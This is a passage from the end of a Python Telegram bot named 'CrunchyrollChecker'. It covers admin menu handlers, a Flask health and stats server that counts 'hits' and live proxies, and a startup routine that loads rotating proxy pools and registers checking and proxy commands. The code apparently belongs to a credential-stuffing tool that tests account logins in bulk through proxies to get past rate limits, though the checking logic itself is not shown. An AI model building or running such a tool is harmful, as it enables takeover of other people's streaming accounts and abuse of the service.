        elif data == "banuser":
            if not is_owner(uid):
                await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "banuser")
            await edit_menu(m, "🚫 <b>Ban User</b>\n\nSend <code>USER_ID</code> to ban.", [[("⬅️ Back", "admins", "danger")]])
            return
        elif data == "unbanuser":
            if not is_owner(uid):
                await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "unbanuser")
            await edit_menu(m, "✅ <b>Unban User</b>\n\nSend <code>USER_ID</code> to unban.\n\nBanned: " + ", ".join([str(x) for x in list(BANNED_USERS)[:10]]), [[("⬅️ Back", "admins", "danger")]])
            return
        elif data == "broadcast":
            if not is_owner(uid):
                await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
                return
            set_pending(uid, "broadcast")
            await edit_menu(m, "📢 <b>Broadcast</b>\n\nSend message to broadcast to all users.", [[("⬅️ Back", "admins", "danger")]])
            return
        elif data in ("genpick", "gen_24", "gen_48", "gen_72", "autocheck", "oxaam", "tv"):
            await edit_menu(m, "ℹ️ <b>Just a Checker</b> — that feature was removed.\nUse <b>💎 Check Account</b> / <b>📂 Check File</b> / <b>🧹 Clean</b>.", [[("⬅️ Back", "menu", "danger")]])
            return
        else:
            await edit_menu(m, "ℹ️ Unknown action. Use menu.", [[("⬅️ Back", "menu", "danger")]])
            return
    except Exception as e:
        logger.error("on_button error data=%s: %s", data if 'data' in locals() else '?', e, exc_info=True)
        try:
            if 'm' in locals() and m:
                await m.reply_text("⚠️ Button error — try again.", parse_mode=ParseMode.HTML)
        except Exception:
            pass

async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
    try:
        err = context.error
        from telegram.error import BadRequest
        if isinstance(err, BadRequest):
            logger.warning("BadRequest suppressed: %s", err)
            return
        logger.error("Unhandled error: %s", err, exc_info=err)
        try:
            if update and hasattr(update, 'effective_message') and update.effective_message:
                await update.effective_message.reply_text(
                    "⚠️ Something went wrong — please try again."
                )
        except Exception:
            pass
    except Exception as e:
        logger.error("on_error itself failed: %s", e)

# ===================== HEALTH SERVER =====================
def start_health_server():
    if not FLASK_OK or not ENABLE_HEALTH:
        print("[*] Health server disabled (Flask missing or ENABLE_HEALTH=0)")
        return
    try:
        app = Flask(__name__)
        CORS(app)

        @app.route("/")
        def root():
            return jsonify({
                "status": "ok",
                "bot": "CrunchyrollChecker",
                "uptime": uptime(),
                "proxies_live": proxy_count(),
                "proxies_pool": pool_size(),
                "checks_done": CHECKS_DONE,
                "hits": TOTAL_HITS,
                "threads": THREADS,
                "version": "v1"
            })

        @app.route("/health")
        def health():
            return jsonify({"status": "healthy", "uptime": uptime(), "live_proxies": proxy_count()})

        @app.route("/stats")
        def stats():
            daily = load_daily_stats()
            return jsonify({
                "uptime": uptime(),
                "live_proxies": proxy_count(),
                "pool": pool_size(),
                "auto": len(AUTO_PROXY_URLS),
                "manual": len(MANUAL_PROXY_URLS),
                "checks_done": CHECKS_DONE,
                "hits": TOTAL_HITS,
                "threads": THREADS,
                "daily": daily,
                "scores": len(PROXY_SCORES),
            })

        @app.route("/ping")
        def ping():
            return "pong", 200

        def run():
            try:
                print(f"[*] Health server starting on 0.0.0.0:{PORT}")
                app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False, threaded=True)
            except Exception as e:
                print(f"[!] Health server failed: {e}")

        threading.Thread(target=run, daemon=True).start()
        print(f"[*] Health server thread started — port {PORT}")
    except Exception as e:
        print(f"[!] Health server start error: {e}")

# ===================== ENTRYPOINT =====================
def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("[!] BOT_TOKEN is not set.  Export BOT_TOKEN=<token from @BotFather>")
        sys.exit(1)
    if not OWNER_ID:
        print("[!] OWNER_ID is not set (or not a number).  Export OWNER_ID=<your Telegram numeric id>")
        sys.exit(1)

    global STORE, THREADS, BANNED_USERS
    STORE = Store(DATA_DIR / "store.json")
    try:
        saved_threads = STORE.get_setting("threads", None)
        if saved_threads and 10 <= int(saved_threads) <= MAX_THREADS_USER:
            THREADS = int(saved_threads)
            print(f"[*] Loaded THREADS from store: {THREADS}")
    except Exception:
        pass

    # Load upgraded data
    load_proxy_scores()
    BANNED_USERS = load_banned()
    # AUTO PROXY LOAD FIX - ensure proxies loaded at startup
    try:
        _load_pool_into_live()
        if proxy_count() == 0:
            print("[*] Auto proxy load: 0 live at startup, force refreshing in background...")
            threading.Thread(target=lambda: refresh_live_proxies(force=True), daemon=True).start()
        else:
            print(f"[*] Auto proxy load: {proxy_count()} live from pool, background refresh starting...")
            threading.Thread(target=lambda: refresh_live_proxies(force=False), daemon=True).start()
    except Exception as e:
        print(f"[!] Auto proxy load startup failed: {e}")
        threading.Thread(target=lambda: refresh_live_proxies(force=True), daemon=True).start()
    print(f"[*] CrunchyrollChecker — BlazeNXT starting")
    print(f"[*] Owner: {OWNER_USERNAME} ({OWNER_ID}) | Threads: {THREADS} | Data dir: {DATA_DIR.resolve()}")
    print(f"[*] Banned: {len(BANNED_USERS)} | Scores: {len(PROXY_SCORES)} | Flask: {FLASK_OK}")

    _load_pool_into_live()
    try:
        auto_on = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
    except Exception:
        auto_on = True

    if auto_on:
        def _bg_initial_refresh():
            try:
                time.sleep(2)
                refresh_live_proxies(force=True)
                print(f"[*] Auto proxies background ready: {proxy_count()} live (auto={len(AUTO_PROXY_URLS)} manual={len(MANUAL_PROXY_URLS)})")
            except Exception as e:
                print(f"[!] Background proxy refresh failed: {e}")
        threading.Thread(target=_bg_initial_refresh, daemon=True).start()
        print(f"[*] Bot starting INSTANTLY — pool: {pool_size()} live: {proxy_count()} (manual={len(MANUAL_PROXY_URLS)}) — auto refresh in background")
    else:
        print(f"[*] Auto Load OFF — bot ready instantly with manual pool: {pool_size()} live: {proxy_count()}")

    threading.Thread(target=_proxy_loop, daemon=True).start()

    # Health server for Railway
    start_health_server()

    print("[+] Bot v1 running. Ctrl+C to stop.")
    print(f"[*] Token: {BOT_TOKEN[:6]}...{BOT_TOKEN[-4:]} len={len(BOT_TOKEN)} | Polling...")

    # auto-restart wrapper - rebuild app each loop to avoid stopped state
    from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, filters

    def build_app():
        _app = Application.builder().token(BOT_TOKEN).build()
        _app.add_handler(CommandHandler("start", cmd_start))
        _app.add_handler(CommandHandler("cmds", cmd_any))
        _app.add_handler(CommandHandler("commands", cmd_any))
        _app.add_handler(CommandHandler("help", cmd_any))
        _app.add_handler(CommandHandler("proxy", cmd_any))
        _app.add_handler(CommandHandler("proxies", cmd_any))
        _app.add_handler(CommandHandler("addproxy", cmd_any))
        _app.add_handler(CommandHandler("clearproxy", cmd_any))
        _app.add_handler(CommandHandler("threads", cmd_any))
        _app.add_handler(CommandHandler("autoproxy", cmd_any))
        _app.add_handler(CommandHandler("autoload", cmd_any))
        _app.add_handler(CommandHandler("stop", cmd_any))
        _app.add_handler(CommandHandler("cancel", cmd_any))
        _app.add_handler(CommandHandler("stopcheck", cmd_any))
        _app.add_handler(CommandHandler("pause", cmd_any))
        _app.add_handler(CommandHandler("resume", cmd_any))
        _app.add_handler(CommandHandler("clean", cmd_any))
        _app.add_handler(CommandHandler("stats", cmd_any))
        _app.add_handler(CommandHandler("history", cmd_any))
        _app.add_handler(CommandHandler("ban", cmd_any))
        _app.add_handler(CommandHandler("unban", cmd_any))
        _app.add_handler(CommandHandler("broadcast", cmd_any))
        _app.add_handler(CommandHandler("admins", cmd_any))
        _app.add_handler(MessageHandler(filters.COMMAND, cmd_any))
        _app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
        _app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
        _app.add_handler(CallbackQueryHandler(on_button))
        _app.add_error_handler(on_error)
        return _app

    while True:
        try:
            _app = build_app()
            _app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)
            break
        except Exception as e:
            logger.error("Polling crashed: %s — restarting in 5s", e, exc_info=True)
            time.sleep(5)

if __name__ == "__main__":
    main()
